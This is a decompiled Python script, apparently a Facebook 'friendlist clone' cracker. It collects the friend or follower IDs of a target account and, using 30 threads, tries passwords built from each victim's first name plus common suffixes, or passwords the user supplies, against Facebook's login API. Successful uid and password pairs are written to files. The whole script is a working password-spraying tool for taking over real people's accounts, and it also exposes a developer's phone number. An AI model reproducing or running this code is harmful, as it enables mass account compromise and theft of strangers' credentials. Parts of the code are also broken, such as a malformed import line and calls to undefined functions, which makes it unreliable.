# Decompile by : Hamid Meer'hamii 

# Time Succes decompile : 2022-03-26 17:46:56.379127 

try:

	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string	from multiprocessing.pool import ThreadPool

	from requests.exceptions import ConnectionError

except ImportError:

	os.system("pip2 install requests")

agents = [

  "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3"

]

birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']

bd = random.randint(2e7, 3e7)

sim = random.randint(2e4, 4e4)

header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

logo ="""

\033[1;91m##     ##    ###    ##     ##    ###    ########  #### 

\033[1;92m###   ###   ## ##   ##     ##   ## ##   ##     ##  ##

\033[1;93m#### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##  

\033[1;94m## ### ## ##     ## ######### ##     ## ##     ##  ##

\033[1;95m##     ## ######### ##     ## ######### ##     ##  ##

\033[1;96m##     ## ##     ## ##     ## ##     ## ##     ##  ##  

\033[1;92m##     ## ##     ## ##     ## ##     ## ########  ####

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

     \033[1;92m➣ \033[1;92mDEVOLPER   :            MAHADI HASAN AFRIDI

     \033[1;91m➣ \033[1;92mFACEBOOK   :            MAHADI HASAN AFRIDI

     \033[1;93m➣ \033[1;92mWHATSAPP   :            01818502669 

     \033[1;96m➣ \033[1;92mGITHUB     :            MAHADI-143

     \033[1;95m➣ \033[1;92mTOOLS      :            FRIENDLIST CLON

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

"""

def tool():

	os.system("clear")

	print("")

	print(logo)

	time.sleep(1)

	print("First Put Tool Username...").center(50)

	print("")

	time.sleep(1)

	username = raw_input("[!] Tool Username : ")

	if username =="MAHADI":

		print("")

		time.sleep(1)

		print("\033[1;93mTool Username is correct").center(50)

		print("")

		time.sleep(1)

		step_main()

	else:

		print("")

		time.sleep(1)

		print("\033[1;91mTool Username Is Invalid :) ").center(50)

		print("")

		time.sleep(1)

		tool()

def step_main():

	os.system("clear")

	print(logo)

	print("")

	time.sleep(1)

	print("First Put Tool Password...").center(50)

	print("")

	time.sleep(1)

	username = raw_input("[!] Tool Password : ")

	if username =="HASAN":

		print("")

		time.sleep(1)

		print("\033[1;94mTool Password is correct").center(50)

		print("")

		time.sleep(1)

		main()

	else:

		print("")

		time.sleep(1)

		print("\033[1;91mTool Password Is Invalid :) ").center(50)

		print("")

		time.sleep(1)

		step_main()

		

def main():

	os.system("clear")

	print(logo)

	print("")

	print("\x1b[1;91m\t(Choose Method)")

	print("")

	print("\x1b[1;92m[1]\x1b[1;92m B-API Method \x1b[1;91m[Best]\n")

	print("\x1b[1;93m[2]\x1b[1;93m Local Host\n")

	print("")

	os.system('xdg-open https://www.facebook.com/4FR1D1.143')

	log_sel()

def log_sel():

	select = raw_input("\033[1;94mChoose option: \033[0;93m")

	if select =="1":

		login()

   

	else:

		print("")

		print("\tSelect valid option")

		print("")

		log_select()

def login():

	try:

		token = open("access_token.txt", "r").read()

		menu()

	except(KeyError , IOError):

		os.system("clear")

		print(logo)

		print("")

		print(" \x1b[1;91m  \t(Login menu)")

		print("")

		print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

		print("\x1b[1;91m[1]\x1b[1;91m Login with id/Pass\n")

		print("\x1b[1;92m[2]\x1b[1;92m Login with token \x1b[1;92m[BEST]\n")

		print("\x1b[1;93m[3]\x1b[1;93m Back ")

		print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

		print("")

		log_select()

def log_select():

	sel = raw_input("\x1b[1;94m Choose option: ")

	if sel =="1":

		log_fb()

	elif sel =="2":

		token()

	elif sel =="3":

		ran()

	else:

		print("")

		print("\tSelect valid option")

		print("")

		log_select()

def log_fb():

	os.system("clear")

	try:

		token = open("access_token.txt", "r").read()

		menu()

	except (KeyError , IOError):

		print(logo)

		print("")

		print("\tFacebook id/pass login")

		print("")

		uid = raw_input(" Uid: ")

		passw = raw_input(" Password: ")

		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text

		q = json.loads(data)

		if "access_token" in q:

			sav = open("access_token.txt", "w")

			sav.write(q["access_token"])

			sav.close()

			menu()

		elif "www.facebook.com" in q["error"]:

			print("")

			print("\tAccount has checkpoint")

			print("")

			time.sleep(1)

			login()

		else:

			print("")

			print("\tId/pass my be wrong")

			print("")

			time.sleep(1)

def token():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

        menu()

    except(KeyError , IOError):

        print(logo)

        

        token = raw_input        ("\x1b[1;92m Paste token :\x1b[1;92m ")

        sav = open("access_token.txt", "w")

        sav.write(token)

        sav.close()

        login()

def menu():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

    except(KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        name = q["name"]

    except(KeyError):

        print(logo)

        print("")

        print("\tLogged in token has expired")

        os.system("rm -rf access_token.txt")

        print("")

        time.sleep(1)

        login()

    os.system("clear")

    print(logo)

    print("")

    print("\x1b[1;91m            WELLCOME : "+name)

    print("")

    print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

    print("")

    print("\x1b[1;91m[1]\x1b[1;91m Crack with Auto pass\n")

    print("\x1b[1;92m[2]\x1b[1;92m Crack with Choice pass\n")

    print("\x1b[1;93m[3]\x1b[1;93m Back ")

    print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

    print("")

    menu_option()

def menu_option():

	select = raw_input("\033[1;92mChoose option: \033[0;93m")

	if select =="1":

		crack()

	elif select =="2":

		choice()

		

	else:

		print("")

		print("\tSelect valid option")

		print("")

		menu_option()

def crack():

	global token

	os.system("clear")

	try:

		token = open("access_token.txt","r").read()

	except IOError:

		print("")

		print("\tToken not found ")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("")

	print("\t    \033[1;32mAUTO PASS CRACK\033[0;97m")

	print("")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("\x1b[1;91m[1]\x1b[1;91m Crack Public Id")

	print("\x1b[1;92m[2]\x1b[1;92m Crack Followers Id")

	print("\x1b[1;93m[0]\x1b[1;93m Back")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	crack_select()

def crack_select():

	select = raw_input("\033[1;31mChoose option: \033[0;92m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		

		idt = raw_input("\x1b[1;92m Input id:\x1b[1;92m ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print('')

			print("  START CRACKING.....")

			print('')

			print("  Cloning from :\x1b[1;92m "+q["name"])

		except KeyError:

			print("\tInvalid link OR token")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		

		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print('')

			print("  START CRACKING.....")

			print('')

			print("  Cloning from:\x1b[1;92m "+q["name"])

		except KeyError:

			print("\tInvalid id link OR token")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="0":

	    menu()

	else:

		print("")

		print("\tSelect valid option")

		print("")

		crack_select()

	print("\x1b[1;91m  Total IDs :\x1b[1;91m "+str(len(id)))

	print("\x1b[1;92m  The Process has been started ✓")

	print("\x1b[1;93m  Plzz wait to Crack idzz")

	print("\x1b[1;94m  Press ctrl + z to stop")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		ranagent = random.choice(agents)

		biran = random.choice(birth)

		session = requests.Session()

		session.headers.update({'User-Agent': ranagent})

		try:

			pass1 = name.lower()+"123"

			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

			q = json.loads(data)

			if "access_token" in q:

				print(" \033[1;31m [MAHADI-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("SYED-ZADAok.txt", "a")

				ok.write(uid+"|"+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error_msg"]:

					print(" \033[1;32m [MAHADI-CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("SYED-ZADAcp.txt", "a")

					cp.write(uid+"|"+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					pass2 = name.lower()+"1234"

					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

					q = json.loads(data)

					if "access_token" in q:

						print(" \033[1;33m [MAHADI-OK] "+uid+" | "+pass2+"\033[0;97m")

						ok = open("SYED-ZADAok.txt", "a")

						ok.write(uid+"|"+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error_msg"]:

							print(" \033[1;34m [MAHADI-CP] "+uid+" | "+pass2+"\033[0;97m")

							cp = open("SYED-ZADAcp.txt", "a")

							cp.write(uid+"|"+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							pass3 = name.lower()+"12345"

							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

							q = json.loads(data)

							if "access_token" in q:

								print(" \033[1;35m [MAHADI-OK] "+uid+" | "+pass3+"\033[0;97m")

								ok = open("SYED-ZADAok.txt", "a")

								ok.write(uid+"|"+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error_msg"]:

									print(" \033[1;36m [MAHADI-CP] "+uid+" | "+pass3+"\033[0;97m")

									cp = open("SYED-ZADAcp.txt", "a")

									cp.write(uid+"|"+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									pass4 = name.lower()+"786"

									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

									q = json.loads(data)

									if "access_token" in q:

										print(" \033[1;31m [MAHADI-OK] "+uid+" | "+pass4+"\033[0;97m")

										ok = open("SYED-ZADAok.txt", "a")

										ok.write(uid+"|"+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error_msg"]:

											print(" \033[1;32m [MAHADI-CP] "+uid+" | "+pass4+"\033[0;97m")

											cp = open("SYED-ZADAcp.txt", "a")

											cp.write(uid+"|"+pass4+"\n")

											cp.close()

											cps.append(uid+pass4)

										else:

											pass5 = name.lower()+"1122"

											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

											q = json.loads(data)

											if "access_token" in q:

												print(" \033[1;33m [MAHADI-OK] "+uid+" | "+pass5+"\033[0;97m")

												ok = open("SYED-ZADAok.txt", "a")

												ok.write(uid+"|"+pass5+"\n")

												ok.close()

												oks.append(uid+pass5)

											else:

												if "www.facebook.com" in q["error_msg"]:

													print(" \033[1;34m [MAHADI-CP] "+uid+" | "+pass5+"\033[0;97m")

													cp = open("SYED-ZADAcp.txt", "a")

													cp.write(uid+"|"+pass5+"\n")

													cp.close()

													cps.append(uid+pass5)

												else:

													pass6 = name.lower()+"1100"

													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

													q = json.loads(data)

													if "access_token" in q:

														print(" \033[1;35m [MAHADI-OK] "+uid+" | "+pass6+"\033[0;97m")

														ok = open("SYED-ZADAok.txt", "a")

														ok.write(uid+"|"+pass6+"\n")

														ok.close()

														oks.append(uid+pass6)

													else:

														if "www.facebook.com" in q["error_msg"]:

															print(" \033[1;36m [MAHADI-CP] "+uid+" | "+pass6+"\033[0;97m")

															cp = open("SYED-ZADAcp.txt", "a")

															cp.write(uid+"|"+pass6+"\n")

															cp.close()

															cps.append(uid+pass6)

														else:

															pass7 = name.lower()+"786786"

															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

															q = json.loads(data)

															if "access_token" in q:

																print(" \033[1;31m [MAHADI-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("SYED-ZADAok.txt", "a")

																ok.write(uid+"|"+pass7+"\n")

																ok.close()

																oks.append(uid+pass7)

															else:

																if "www.facebook.com" in q["error_msg"]:

																	print(" \033[1;32m [MAHADI-CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("SYED-ZADAcp.txt", "a")

																	cp.write(uid+"|"+pass7+"\n")

																	cp.close()

																	cps.append(uid+pass7)

		except:

			pass

	p = ThreadPool(30)

	p.map(main, id)

	print("")

	print("")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("   \x1b[1;94mThe process has been completed")

	print("   \x1b[1;94m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	print("")

	raw_input(" \x1b[1;93m Press enter to back ")

	menu()

def choice():

	global token

	os.system("clear")

	try:

		token = open("access_token.txt","r").read()

	except IOError:

		print("")

		print("\tToken not found")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("")

	print("\t    \033[1;32mCHOICE PASS CRACK\033[0;97m")

	print("")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("\x1b[1;91m[1]\x1b[1;91m Crack Public id")

	print("\x1b[1;92m[2]\x1b[1;92m Crack Followers id")

	print("\x1b[1;93m[0]\x1b[1;93m Back")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	choice_select()

def choice_select():

	select = raw_input("\033[1;33mChoose option: \033[0;92m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		print("")

		print("\t    \033[1;32mCHOICE PASS PUBLIC CRACKING\033[0;97m")

		print("")

		pass1 = raw_input("\x1b[1;91m Password:\x1b[1;91m ")

		pass2 = raw_input("\x1b[1;92m Password:\x1b[1;92m ")

		pass3 = raw_input("\x1b[1;93m Password:\x1b[1;93m ")

		pass4 = raw_input("\x1b[1;94m Password:\x1b[1;94m ")

		pass5 = raw_input("\x1b[1;95m Password:\x1b[1;95m ")

		pass6 = raw_input("\x1b[1;96m Password:\x1b[1;96m ")

		pass7 = raw_input("\x1b[1;91m Password:\x1b[1;91m ")

		idt = raw_input("\x1b[1;93m Input id:\x1b[1;93m ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print(" Cloning from :\x1b[1;92m "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		print("")

		print("\t    \033[1;32mCHOICE PASS FOLLOWERS CRACKING \033[0;97m")

		print("")

		pass1 = raw_input("\x1b[1;91m Password:\x1b[1;91m ")

		pass2 = raw_input("\x1b[1;92m Password:\x1b[1;92m ")

		pass3 = raw_input("\x1b[1;93m Password:\x1b[1;93m ")

		pass4 = raw_input("\x1b[1;94m Password:\x1b[1;94m ")

		pass5 = raw_input("\x1b[1;95m Password:\x1b[1;95m ")

		pass6 = raw_input("\x1b[1;96m Password:\x1b[1;96m ")

		pass7 = raw_input("\x1b[1;92m Password:\x1b[1;92m ")

		idt = raw_input("\x1b[1;94m Input id:\x1b[1;94m ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print(" Cloning from:\x1b[1;92m "+q["name"])

		except KeyError:

			print("\tInvalid id link")

			print("")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="0":

	    menu()

	else:

		print("")

		print("\tSelect valid option\033[0;97m")

		print("")

		choice_select()

	print("\x1b[1;91m  Total IDs :\x1b[1;92m "+str(len(id)))

	print("\x1b[1;92m  The Process has been started ✓")

	print("\033[1;93m  Plzz wait to Crack idzz")

	print("\x1b[1;94m  Press ctrl + z to stop")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		ranagent = random.choice(agents)

		session = requests.Session()

		session.headers.update({'User-Agent': ranagent})

		try:

			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

			q = json.loads(data)

			if "access_token" in q:

				print(" \033[1;32m [MAHADI-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("SYED-ZADAok.txt", "a")

				ok.write(uid+"|"+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error_msg"]:

					print(" \033[1;31m [MAHADI-CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("SYED-ZADAcp.txt", "a")

					cp.write(uid+"|"+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

					q = json.loads(data)

					if "access_token" in q:

						print(" \033[1;36m [MAHADI-OK] "+uid+" | "+pass2+"\033[0;97m")

						ok = open("SYED-ZADAok.txt", "a")

						ok.write(uid+"|"+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error_msg"]:

							print(" \033[1;35m [MAHADI-CP] "+uid+" | "+pass2+"\033[0;97m")

							cp = open("SYED-ZADAcp.txt", "a")

							cp.write(uid+"|"+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

							q = json.loads(data)

							if "access_token" in q:

								print(" \033[1;34m [MAHADI-OK] "+uid+" | "+pass3+"\033[0;97m")

								ok = open("SYED-ZADAok.txt", "a")

								ok.write(uid+"|"+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error_msg"]:

									print(" \033[1;33m [MAHADI-CP] "+uid+" | "+pass3+"\033[0;97m")

									cp = open("SYED-ZADAcp.txt", "a")

									cp.write(uid+"|"+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

									q = json.loads(data)

									if "access_token" in q:

										print(" \033[1;32m [MAHADI-OK] "+uid+" | "+pass4+"\033[0;97m")

										ok = open("SYED-ZADAok.txt", "a")

										ok.write(uid+"|"+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error_msg"]:

											print(" \033[1;31m [MAHADI-CP] "+uid+" | "+pass4+"\033[0;97m")

											cp = open("SYED-ZADAcp.txt", "a")

											cp.write(uid+"|"+pass4+"\n")

											cp.close()

											cps.append(uid+pass4)

										else:

											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

											q = json.loads(data)

											if "access_token" in q:

												print(" \033[1;36m [MAHADI-OK] "+uid+" | "+pass5+"\033[0;97m")

												ok = open("SYED-ZADAok.txt", "a")

												ok.write(uid+"|"+pass5+"\n")

												ok.close()

												oks.append(uid+pass5)

											else:

												if "www.facebook.com" in q["error_msg"]:

													print(" \033[1;35m [MAHADI-CP] "+uid+" | "+pass5+"\033[0;97m")

													cp = open("SYED-ZADAcp.txt", "a")

													cp.write(uid+"|"+pass5+"\n")

													cp.close()

													cps.append(uid+pass5)

												else:

													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

													q = json.loads(data)

													if "access_token" in q:

														print(" \033[1;34m [MAHADI-OK] "+uid+" | "+pass6+"\033[0;97m")

														ok = open("SYED-ZADAok.txt", "a")

														ok.write(uid+"|"+pass6+"\n")

														ok.close()

														oks.append(uid+pass6)

													else:

														if "www.facebook.com" in q["error_msg"]:

															print(" \033[1;23m [MAHADI-CP] "+uid+" | "+pass6+"\033[0;97m")

															cp = open("SYED-ZADAcp.txt", "a")

															cp.write(uid+"|"+pass6+"\n")

															cp.close()

															cps.append(uid+pass6)

														else:

															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

															q = json.loads(data)

															if "access_token" in q:

																print(" \033[1;32m [MAHADI-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("SYED-ZADAok.txt", "a")

																ok.write(uid+"|"+pass7+"\n")

																ok.close()

																oks.append(uid+pass7)

															else:

																if "www.facebook.com" in q["error_msg"]:

																	print(" \033[1;31m [MAHADI-CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("SYED-ZADAcp.txt", "a")

																	cp.write(uid+"|"+pass7+"\n")

																	cp.close()

																	cps.append(uid+pass7)

		except:

			pass

	p = ThreadPool(30)

	p.map(main, id)

	print("")

	print("")

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print(" \x1b[1;91m  The process has been completed")

	print(" \x1b[1;92m   Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'

	print("")

	print("")

	raw_input(" \x1b[1;93m Press enter to back ")

	main()

	

	

if __name__ == '__main__':

	tool()
